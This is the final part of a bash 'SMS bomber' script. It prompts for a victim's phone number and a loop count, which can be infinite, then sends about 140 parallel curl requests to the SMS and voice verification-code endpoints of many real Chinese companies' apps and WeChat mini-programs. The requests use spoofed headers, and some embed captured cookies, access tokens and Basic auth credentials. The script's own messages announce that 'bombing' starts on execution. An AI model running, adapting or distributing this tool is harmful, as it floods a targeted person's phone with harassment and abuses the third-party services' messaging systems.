    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx4d68f497875d7e2c/33/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "phone=$phone" &
echo "第114个接口运行完毕"

curl -X POST "https://api.9tax.com/newspaper/user/sendMessage" \
    -H "Host: api.9tax.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 17" \
    -H "scene: pzt_weixin_0.0.116" \
    -H "system: {\"model\":\"microsoft\",\"appName\":\"wxe1f61a425eaae0b8\",\"system\":\"Windows 10 x64\"}" \
    -H "xweb_xhr: 1" \
    -H "appid: wx86f84c798cfb9a6b" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/x-www-form-urlencoded;charset=UTF-8" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx86f84c798cfb9a6b/21/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "phone=$phone" &
echo "第115个接口运行完毕"
curl -X POST "https://m.midea.cn/next/user_assist/getmobilevc" \
    -H "Host: m.midea.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 38" \
    -H "X-Wx-Version: 3.9.6/3.4.1" \
    -H "xweb_xhr: 1" \
    -H "X-Wx-Appid: wxa13e96304985b75d" \
    -H "Cookie: midea_mk=486649a8b67c920c3134dd81ed1e3aa;plt=wxsapp;appname=weapp_fx_r" \
    -H "X-Wx-Ref: pages/login/login" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9105" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxa13e96304985b75d/158/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "scene=terminal_shop&mobile=$phone" &
echo "第116个接口运行完毕"

curl -X POST "https://api.shengtuanyouxuan.com/mini/life/v1/captcha/getCaptcha" \
    -H "Host: api.shengtuanyouxuan.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 49" \
    -H "mini-type: miniLife" \
    -H "xweb_xhr: 1" \
    -H "mini-version: 2.4.5" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309092b)XWEB/8461" \
    -H "sign: QKwUegAfSGGrcQyas7TsB4uCP78=" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx97e0a0a3ea2f4155/11/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "{\"phone\": \"$phone\", \"bizCode\": \"miniBindPhone\"}" &
echo "第117个接口运行完毕"

curl -X POST "https://web.tlawyer.cn/account/sendsmsregister" \
    -H "Host: web.tlawyer.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 17" \
    -H "sec-ch-ua: \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"" \
    -H "Accept: application/json, text/javascript, */*; q=0.01" \
    -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "sec-ch-ua-mobile: ?0" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309092b)XWEB/8461" \
    -H "sec-ch-ua-platform: \"Windows\"" \
    -H "Origin: https://web.tlawyer.cn" \
    -H "Sec-Fetch-Site: same-origin" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://web.tlawyer.cn/account/reg?ref=/app/ask/lhxy" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -H "Cookie: _app=lhxy; _user_sid=bqe43fdvv5lievv4ravjd5v0" \
    --data-raw "phone=$phone" &
echo "第118个接口运行完毕"

curl -X POST "https://wap-api.duoyou.com/index.php/member/send_verification?game_id=100206&media_id=dy_59639386&is_red_sdk=1&idfa=89238414-3824-4F4D-BC95-8DABAB134023" \
    -H "Host: wap-api.duoyou.com" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Sec-Fetch-Site: same-site" \
    -H "Accept-Language: zh-CN,zh-Hans;q=0.9" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Content-Type: application/json;charset=utf-8" \
    -H "Origin: https://wap.duoyou.com" \
    -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1" \
    -H "Referer: https://wap.duoyou.com/" \
    -H "Connection: keep-alive" \
    -H "Sec-Fetch-Dest: empty" \
    --data-raw "{\"scene\": \"smsLogin\", \"mobile\": \"$phone\"}" &
echo "第121个接口运行完毕"

# Shell script for request_url122
curl -X POST "https://passport.xag.cn/home/sms_code" \
    -H "Host: passport.xag.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 24" \
    -H "mini: member" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Authorization: Basic QTFDQ0FFOUItNjcwMi0wOUY4LTVDNjUtOTM3M0ZEQkY4OTY4OjNhYzcxNjk2OGM0NzlmMmMzZTVhYjc1MjQ2OTYyMWJi" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: application/json" \
    -H "xweb_xhr: 1" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "token: " \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx43471742f3e783cb/213/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "icc=86&phone=$phone" &
echo "第122个接口运行完毕"

# Shell script for request_url123
curl -X POST "https://m-sqhlwyy.panyu.gd.cn/med/gateway/640009/ytGateway" \
    -H "Host: m-sqhlwyy.panyu.gd.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 54" \
    -H "SRType: wechat" \
    -H "yt-h5url: /packages/login_with_phone/index" \
    -H "SRKey: panyu" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "X-WX-Model: microsoft" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "xweb_xhr: 1" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "Cookie: connect.sid=s:jvqIK7Zaee0wu5JbSuZZ8sDhjMo3IR0f.b0SnJDCKgOHw2fmQVXxjPzQpLNRk%2B8HWTj3o2LX1BU0" \
    -H "version: 89.1.0" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx6b114e41079b7388/3/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "api_name=/r/10001/103@udb3&phoneNo=$phone" &
echo "第123个接口运行完毕"
# Shell script for request_url124
curl -X POST "https://fcm2-5.ocj.com.cn/api/newMedia/login/mini/login/securityCode" \
    -H "Host: fcm2-5.ocj.com.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 58" \
    -H "X-media: 03" \
    -H "X-media-channel: 6" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9105" \
    -H "X-chl-code: 3" \
    -H "Content-Type: application/json" \
    -H "X-msale-platform: SP" \
    -H "X-msale-code: MM" \
    -H "X-msale-way: AMM" \
    -H "xweb_xhr: 1" \
    -H "X-source: SPG" \
    -H "X-chain-id: " \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx7e98237a4154ffc7/110/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "{\"phone\": \"$phone\", \"purpose\": \"quick_register_context\"}" &
echo "第124个接口运行完毕"

# Shell script for request_url125
curl -X POST "https://api.cdfsunrise.com/restapi/user/sendMobileCode" \
    -H "Host: api.cdfsunrise.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 214" \
    -H "AppVersion: 1.29.6" \
    -H "MiniApp: weapp" \
    -H "mobile: " \
    -H "showLoading: [object Boolean]" \
    -H "UserSystem: WeChat" \
    -H "OsVersion: 10" \
    -H "device: " \
    -H "openid: " \
    -H "ClientNetwork: wifi" \
    -H "headers: [object Object]" \
    -H "OS: unknown" \
    -H "UnionId: " \
    -H "DeviceId: DCB544E2087CEE28-A0B923820DCC509A-253638247" \
    -H "accessToken: WyI5MjlFNUUyQ0Q4RjkxRDlCLUEwQjkyMzgyMERDQzUwOUEtMjE0NDMyNzEzIiwiOTI5RTVFMkNEOEY5MUQ5Qi1BMEI5MjM4MjBEQ0M1MDlBLTIxNDQzMjcxMyJd;0;ZXlKMGVYQmxJam9pZEdGeWIxOTNaV0Z3Y0NJc0ltMXZaR1ZzSWpvaWJXbGpjbTl6YjJaMElpd2ljM2x6ZEdWdElqb2lWMmx1Wkc5M2N5QXhNQ0I0TmpRaUxDSmhjSEJmYm1GdFpTSTZJbXhsWm05NExXOW1abWxqYVdGc0xXMXBibWx3Y205bmNtRnRJaXdpZG1WeWMybHZiaUk2SWpFdU1qa3VOaUlzSW5ObGNtbGhiRTVQSWpvaWIxOWxNMm8wYkU1cmIxaDZaVGxXWWtSeVdIRXlSMll4YVVwbmF5SXNJbUZqWTI5MWJuUkpSQ0k2SWpreU9VVTFSVEpEUkRoR09URkVPVUl0UVRCQ09USXpPREl3UkVORE5UQTVRUzB5TVRRME16STNNVE1pTENKemFXZHVJam9pWm1FeU1XVmpPV1l3WW1VMk1qQXdaakZtWVRNek5EbGhPVGt6WkRJMk9XRWlmUT09;Ym5Wc2JBbz0=;;W10=;240d8fe412d77294dfdef557cd30de9d34b6c5a95b2642656419d620503ffb53ae2d23eb8d1de7a0afb165aa181e35c6786d9ae8f2ac137f8fd7d39051e6cfc1" \
    -H "Referrer-Policy: origin" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9105" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "xweb_xhr: 1" \
    -H "alipayopenid: " \
    -H "deviceModel: microsoft" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx82028cdb701506f3/181/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "{\"mobileCodeType\": \"mobileLogin\", \"mobileNo\": \"$phone\", \"sign\": \"md5sign\", \"timeStamp\": \"1713177231575\", \"deviceId\": \"Bkm9UNmPJJnDQ+JUmFhfc+gHKSId9U/vXW6S1Fremx0ex4JnwRIcgGva0jXeA1hFmgCHgjsSYh1ZcYUwXv+tufw==\", \"rid\": \"\"}" &
echo "第125个接口运行完毕"
# Shell script for request_url126
curl -X POST "https://vipainisheng.com/user/app/open/user/sendSms" \
    -H "Host: vipainisheng.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 302" \
    -H "xweb_xhr: 1" \
    -H "loginDevictType: XCX" \
    -H "cookie: " \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9105" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx5f198a7cd2798103/8/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw '{"jmxygtz": "", "vcVersionCode": "1.6.2", "language": "zh_CN", "loginDevictType": "XCX", "appCode": "JS", "xcxAppId": "wx5f198a7cd2798103", "mobile": "$phone", "affairType": 1, "area": "+86", "en": "Hf5FRgv5tjYBW5FIgJG6Mpp94VaqgFNVugxYQks0Us67L2ujaFcjOWRMVj1V4swL/rVe5ADkyXimIJ53T194Fg==", "uuid": "", "captchaCode": ""}' &
echo "第126个接口运行完毕"

# Shell script for request_url127
curl -X POST "https://mobilev2.atomychina.com.cn/api/user/web/login/login-send-sms-code" \
    -H "Host: mobilev2.atomychina.com.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 68" \
    -H "pragma: no-cache" \
    -H "design-site-locale: zh-CN" \
    -H "Accept-Language: zh-CN" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9105" \
    -H "X-HTTP-REQUEST-DOMAIN: mobilev2.atomychina.com.cn" \
    -H "Content-Type: application/json" \
    -H "Accept: application/json" \
    -H "cache-control: no-cache" \
    -H "xweb_xhr: 1" \
    -H "x-requested-with: XMLHttpRequest" \
    -H "cookie: acw_tc=0b6e702e17131629263394156e104b9681bb7f7854d38d5dfc0dff560ade54; guestId=01e7996e-454f-4bab-bd84-44b6d2277113; 15 Apr 2025 06:35:26 GMT; guestId.sig=jWFSrGBOhFwEfFZJbEoMSYkDoO8; 15 Apr 2025 06:35:50 GMT; 15 Apr 2025 06:35:52 GMT" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx74d705d9fabf5b77/97/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    --data-raw '{"mobile": "$phone", "captcha": "1111", "token": "1111", "prefix": 86}' &
echo "第127个接口运行完毕"
# Shell script for request_url128
curl -X GET "https://user.yunjiglobal.com/yunjiuserapp/userapp/generateVoiceSmsCode.json?phone=86$phone&appCont=1" &
echo "第128个接口运行完毕"

# Shell script for request_url129
curl -X POST "https://community.lishuizongzhi.com/wx-life/mc/auth/code" \
    -H "Host: community.lishuizongzhi.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 23" \
    -H "accesstoken: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJvcGVuSWQiOiJvOHpBNjVibzFVMDhwdGlxRkJTMmd0VGgwaTZBIiwiYXBwSWQiOiJ3eDI4ZWUyYjdlYzExOTFjMzEiLCJsb2dpblRpbWUiOjE3MTExOTIwNzAyOTd9.m2nzRIQMVmcET1VuyYJLmuTjZtuTAUwY1QwZSnVX0RM" \
    -H "companyNo: " \
    -H "houseId: " \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "xweb_xhr: 1" \
    -H "neighNo: " \
    -H "version: 1.4.6" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx28ee2b7ec1191c31/20/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw '{"phone": "'$phone'"}' &
echo "第129个接口运行完毕"

# Shell script for request_url130
curl -X GET "https://card.10010.com/ko-order/messageCaptcha/send?phoneVal=$phone" &
echo "第130个接口运行完毕"

# Shell script for request_url131
curl -X GET "https://igetcool-gateway.igetcool.com/app-api-user-server/white/sms/voice.json?phone=$phone&smstype=1" &
echo "第131个接口运行完毕"

# Shell script for request_url132
curl -X GET "https://delivery-api.imdada.cn/v2_0/account/sendVoiceSMSCode/?phone=$phone&type=2" &
echo "第132个接口运行完毕"
# Shell script for request_url133
curl -X POST 'https://api-smart.ddzuwu.com/api/users/login/send-sms' \
    -H 'Host: api-smart.ddzuwu.com' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Accept: application/json' \
    -H 'Connection: keep-alive' \
    -H 'Platform: 1' \
    -H 'Models: iPhone12,1' \
    -H 'Version: 2.8.7' \
    -H 'User-Agent: dingdongzuwu/2.8.7 (iPhone; iOS 16.6.1; Scale/2.00)' \
    -H 'Accept-Language: zh-Hans-CN;q=1' \
    -H 'Accept-Encoding: gzip, deflate, br' \
    --data-urlencode "phone=$phone" &
echo "第133个接口运行完毕"

# Shell script for request_url134
curl -X POST 'https://api.boxtrip.vip/v1/api/sms/login' \
    -H 'Host: api.boxtrip.vip' \
    -H 'Accept: */*' \
    -H 'version: 1.2.4' \
    -H 'Accept-Encoding: gzip, deflate, br' \
    -H 'Accept-Language: zh-CN,zh-Hans;q=0.9' \
    -H 'platform: ios' \
    -H 'signature: 2143352315' \
    -H 'Content-Length: 24' \
    -H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app' \
    -H 'Connection: keep-alive' \
    -H 'Content-Type: application/json' \
    -H 'deviceBrand: iphone' \
    --data-raw "{\"mobile\":\"$phone\"}" &
echo "第134个接口运行完毕"
# Shell script for request_url135
curl -X POST 'https://anmo.jiudiananmo.com/index.php?i=666&t=0&v=3.0&from=wxapp&c=entry&a=wxapp&do=api&core=core2&m=longbing_massages_city&s=massage/app/Index/sendShortMsg&urls=massage/app/Index/sendShortMsg' \
    -H 'Host: anmo.jiudiananmo.com' \
    -H 'Content-Type: application/json;charset=utf-8' \
    -H 'Accept: */*' \
    -H 'Accept-Encoding: gzip, deflate, br' \
    -H 'Connection: keep-alive' \
    -H 'market: 8' \
    -H 'isapp: 1' \
    -H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app' \
    -H 'autograph: ' \
    -H 'Content-Length: 23' \
    -H 'Accept-Language: zh-CN,zh-Hans;q=0.9' \
    --data-raw "{\"phone\":\"$phone\"}" &
echo "第135个接口运行完毕"

# Shell script for request_url136
curl -X POST 'https://api.dingdong.lrswlkj.com/auth/sendLoginMobileCode' \
    -H 'Host: api.dingdong.lrswlkj.com' \
    -H 'Content-Type: application/json' \
    -H 'Accept-Encoding: gzip, deflate, br' \
    -H 'Connection: keep-alive' \
    -H 'Accept: */*' \
    -H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app' \
    -H 'Content-Length: 33' \
    -H 'token: ' \
    -H 'Accept-Language: zh-CN,zh-Hans;q=0.9' \
    --data-raw "{\"mobile\":\"$phone\",\"type\":0}" &
echo "第136个接口运行完毕"

# Shell script for request_url137
curl -X POST 'https://mgr.moyunk.com/api/appAuth/smsCode' \
    -H 'Host: mgr.moyunk.com' \
    -H 'Content-Type: application/json' \
    -H 'Connection: keep-alive' \
    -H 'Accept: */*' \
    -H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app' \
    -H 'Content-Length: 24' \
    -H 'Accept-Language: zh-CN,zh-Hans;q=0.9' \
    -H 'Accept-Encoding: gzip, deflate, br' \
    --data-raw "{\"mobile\":\"$phone\"}" &
echo "第137个接口运行完毕"
# Shell script for request_url140
curl -X POST "https://api.meipao.vip/make_rider/v1/send_provider_sms" \
    -H "Host: api.meipao.vip" \
    -H "Content-Type: application/x-www-form-urlencoded;charset=utf-8" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Connection: keep-alive" \
    -H "Accept: application/json" \
    -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app" \
    -H "Authorization: bearer undefined" \
    -H "Content-Length: 58" \
    -H "Accept-Language: zh-CN,zh-Hans;q=0.9" \
    --data-raw "mobile=$phone&type=rider_login&m=make_rider&uniacid=0" &
echo "第140个接口运行完毕"

# Shell script for request_url141
curl -X POST "https://open.iconntech.com/unifyUser/sendMsg" \
    -H "Host: open.iconntech.com" \
    -H "Content-Type: application/json" \
    -H "Connection: keep-alive" \
    -H "Accept: */*" \
    -H "User-Agent: HZCitizenCardapp/6.7.6 (iPhone; iOS 16.6.1; Scale/2.00)" \
    -H "Accept-Language: zh-Hans-CN;q=1" \
    -H "Content-Length: 39" \
    -H "Accept-Encoding: gzip, deflate, br" \
    --data-raw "{\"msgType\":\"01\",\"mobile\":\"$phone\"}" &
echo "第141个接口运行完毕"

# Shell script for request_url142
curl -X POST "https://app.dianjingjob.com/api/v1/5f8aa4831930c" \
    -H "Host: app.dianjingjob.com" \
    -H "appid: 91562284" \
    -H "Accept: */*" \
    -H "timestamp: 1714822056" \
    -H "signaturenonce: 6f2fda6d4a10c1ee6373a33ff46637f8a1fa4929" \
    -H "Accept-Language: zh-CN,zh-Hans;q=0.9" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "signature: a4ae58d89f0df0e7166be4371c0b2d944f4699d9" \
    -H "Content-Type: application/json" \
    -H "Content-Length: 47" \
    -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app" \
    -H "Connection: keep-alive" \
    --data-raw "{\"is_test\":0,\"mobile\":\"$phone\",\"type\":\"1\"}" &
echo "第142个接口运行完毕"

# Shell script for request_url143
curl -X POST "https://xnvfgk.sjrjyffs.top/api/app/sms/getcode" \
    -H "Host: xnvfgk.sjrjyffs.top" \
    -H "Content-Type: application/json" \
    -H "userType: app_user" \
    -H "Accept: */*" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 44" \
    -H "User-Agent: GGTravelGuide/1.2.8 (com.TravelGuide.success; build:1; iOS 16.6.1) Alamofire/5.7.1" \
    -H "Accept-Language: zh-Hans-CN;q=1.0" \
    -H "Authorization: Bearer noToken" \
    -H "Accept-Encoding: br;q=1.0, gzip;q=0.9, deflate;q=0.8" \
    --data-raw "{\"systemType\":4,\"phonenumber\":\"$phone\"}" &
echo "第143个接口运行完毕"
            sleep 0
        done
        echo "所有循环完成。"
    fi
}

# 获取用户输入
echo "执行后才开始轰炸(后续看情况优化)"
echo "采用随机142个接口"
echo "SethAion制作"
echo "--------------------------------"
echo "请输入手机号："
read phone
echo "请输入循环次数（输入null或0进行无限循环）: "
read loop_count
# 调用函数
execute_loop "$loop_count"
